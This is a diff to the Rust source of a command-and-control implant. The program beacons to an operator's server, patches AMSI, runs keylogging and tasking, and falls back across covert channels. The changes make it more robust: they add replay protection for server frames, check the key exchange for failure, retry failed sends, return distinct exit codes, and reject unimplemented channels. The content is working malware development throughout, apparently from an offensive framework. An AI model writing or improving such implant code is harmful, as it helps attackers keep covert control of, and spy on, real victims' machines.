@@ -126,7 +126,13 @@ unsafe fn beacon_init() -> Option<BeaconInit> {
             }
         }
     };
-    let key = kp.session_key(&cfg.server_pub);
+    let key = match kp.session_key(&cfg.server_pub) {
+        Ok(k) => k,
+        Err(_) => {
+            crate::entry::diag_mark(b"ERR_KEYEXCH_NONCONTRIB");
+            return None;
+        }
+    };
     crate::mem::register_key(*key.as_bytes());
     let pubkey = kp.public_bytes();
 
@@ -240,6 +246,40 @@ fn beacon_cycle_setup(
     true
 }
 
+/// Last-seen server→implant frame counter (S2C replay protection). The server
+/// pre-increments its per-session `send_counter` before every S2C frame
+/// (crates/server/src/lib.rs), so a fresh session's first reply has counter 1
+/// and every later reply is strictly greater. An attacker replaying an old
+/// server response would otherwise re-deliver stale tasks (the AEAD open would
+/// even succeed, since the replayed ciphertext was sealed under the same key
+/// and counter); rejecting any counter ≤ the last accepted one closes that.
+/// `AtomicU64` because the same single beacon thread both reads and updates it
+/// lock-free; starts at 0 so the first frame (counter ≥ 1) is always accepted.
+static LAST_SERVER_COUNTER: core::sync::atomic::AtomicU64 =
+    core::sync::atomic::AtomicU64::new(0);
+
+/// Accept a server frame counter iff it is strictly greater than the last one
+/// seen (recording it). Returns false for replayed/stale frames — the caller
+/// then drops the frame without dispatching (replay protection, not a fatal
+/// error). Lock-free CAS loop, safe on the single beacon thread.
+fn accept_server_counter(counter: u64) -> bool {
+    let mut last = LAST_SERVER_COUNTER.load(core::sync::atomic::Ordering::Relaxed);
+    loop {
+        if counter <= last {
+            return false;
+        }
+        match LAST_SERVER_COUNTER.compare_exchange_weak(
+            last,
+            counter,
+            core::sync::atomic::Ordering::Relaxed,
+            core::sync::atomic::Ordering::Relaxed,
+        ) {
+            Ok(_) => return true,
+            Err(current) => last = current,
+        }
+    }
+}
+
 /// Encode + send the pending batch, advancing counter on success.
 /// On send failure, tries fallback channels.
 fn beacon_send_frame(
@@ -253,15 +293,22 @@ fn beacon_send_frame(
         Ok(f) => f,
         Err(_) => return None,
     };
-    *counter += 1;
-    pending.clear();
     // SAFETY: same contract as the beacon_loop call sites — `ch_ctx` outlives
     // the call and the active channel's fns were resolved at bootstrap.
     let body = unsafe {
         crate::channels::dispatch_send_recv(ch_ctx, crate::channels::get_active(), &frame)
     };
     match body {
-        Some(b) => Some(b),
+        Some(b) => {
+            // P0-3: only advance the counter (and drop the batch) once the
+            // round-trip actually succeeded — mirrors the oneshot flush and
+            // the mid-cycle flush below. On failure we keep `pending` and the
+            // SAME counter so the next cycle re-encodes and retries the batch
+            // instead of silently dropping it (or desyncing the sequence).
+            *counter += 1;
+            pending.clear();
+            Some(b)
+        }
         None => {
             let active = crate::channels::get_active();
             if let Some(fb) = crate::channels::next_fallback(active) {
@@ -287,6 +334,13 @@ unsafe fn beacon_dispatch_tasks(
     pending: &mut Vec<TaskResponse>,
 ) -> bool {
     let Ok(raw) = parse_frame(body) else { return true };
+    // S2C replay protection: drop frames whose server counter is not strictly
+    // greater than the last accepted one (stale/replayed response). Returning
+    // true keeps the beacon loop running — the next cycle's POST gets a fresh
+    // server reply.
+    if !accept_server_counter(raw.counter) {
+        return true;
+    }
     let Ok(plaintext) = open_frame_dir(key, Direction::ServerToClient, &raw) else { return true };
     let Ok(tasks) = Task::decode_vec(&plaintext) else { return true };
 
@@ -320,10 +374,15 @@ unsafe fn beacon_dispatch_tasks(
 // ── Main loop ───────────────────────────────────────────────────────────────
 
 /// The beacon loop, called from `nyx_entry` after resolve + alloc bootstrap.
-pub unsafe fn beacon_loop() {
+///
+/// Returns an exit code so the entry points can report why the loop ended:
+///   - `0xAF`: `beacon_init` failed (CSPRNG keygen / SessionInfo encode) —
+///     the "0xAF family" init-failure code, mirroring `beacon_oneshot`'s 0xAF
+///   - `0x00`: loop terminated normally (kill-date reached or `Exit` task)
+pub unsafe fn beacon_loop() -> u32 {
     let init = match beacon_init() {
         Some(s) => s,
-        None => return,
+        None => return 0xAF, // init failed — distinct exit code (0xAF family)
     };
     let BeaconInit { cfg, implant, key, pubkey, info_plain, rt, ch_ctx, .. } = init;
 
@@ -337,7 +396,7 @@ pub unsafe fn beacon_loop() {
     loop {
         // Per-cycle setup: kill-date, AMSI, sleep, keylog, channel drain.
         if !beacon_cycle_setup(&implant, &mut cycle, &mut amsi_patched, &cfg, &mut pending) {
-            return;
+            return 0x00; // kill-date reached — deliberate clean stop
         }
 
         // Encode + send pending batch, receive server reply.
@@ -347,7 +406,7 @@ pub unsafe fn beacon_loop() {
 
         // Decode reply, dispatch tasks, flush mid-cycle.
         if !beacon_dispatch_tasks(&body, &key, &pubkey, &mut counter, &cfg, rt, &ch_ctx, &mut pending) {
-            return;
+            return 0x00; // Exit task received — deliberate clean stop
         }
     }
 }
@@ -395,7 +454,13 @@ pub unsafe fn beacon_oneshot() -> u32 {
     };
     // DIAG step 2: keygen done (if we crash here → CSPRNG or curve25519)
     crate::entry::diag_mark(b"b3_keygen");
-    let key = kp.session_key(&cfg.server_pub);
+    let key = match kp.session_key(&cfg.server_pub) {
+        Ok(k) => k,
+        Err(_) => {
+            crate::entry::diag_mark(b"ERR_ONESHOT_KEYEXCH");
+            return 0xB0; // non-contributory key exchange failure exit code
+        }
+    };
     // DIAG step 3: session_key (HKDF) done
     crate::entry::diag_mark(b"b4_skey");
     crate::mem::register_key(*key.as_bytes());
@@ -492,6 +557,11 @@ pub unsafe fn beacon_oneshot() -> u32 {
         let Ok(raw) = parse_frame(&body) else {
             continue;
         };
+        // S2C replay protection (same as beacon_dispatch_tasks): drop
+        // stale/replayed server frames instead of re-dispatching them.
+        if !accept_server_counter(raw.counter) {
+            continue;
+        }
         let Ok(plaintext) = open_frame_dir(&key, Direction::ServerToClient, &raw) else {
             continue;
         };
@@ -631,6 +701,18 @@ fn execute(
             // MED-NEW-I5 where _ => SmbPipe killed the beacon with a "success"
             // ack is fixed: from_u8's catch-all is Https, a safe no-op).
             let ch = crate::channels::Channel::from_u8(channel);
+            // SmbPipe/Tcp have NO parent-side implementation in this repo
+            // (implant-channels-2/3): a channel that can never transact must
+            // be REJECTED loudly, not silently accepted — the operator gets a
+            // clear error instead of a beacon that spins on a dead pipe/socket.
+            if !ch.is_implemented() {
+                crate::entry::diag_mark(b"ERR_CH_NOT_IMPL");
+                let mut e: crate::heap::String =
+                    crate::heap::String::from("SetChannel rejected: ");
+                e.push_str(ch.name());
+                e.push_str(" has no parent-side implementation in this build");
+                return vec![Response::Err(e)];
+            }
             crate::channels::set_active(ch);
             let mut out: crate::heap::Vec<u8> = crate::heap::Vec::new();
             out.extend_from_slice(b"Channel set to: ");
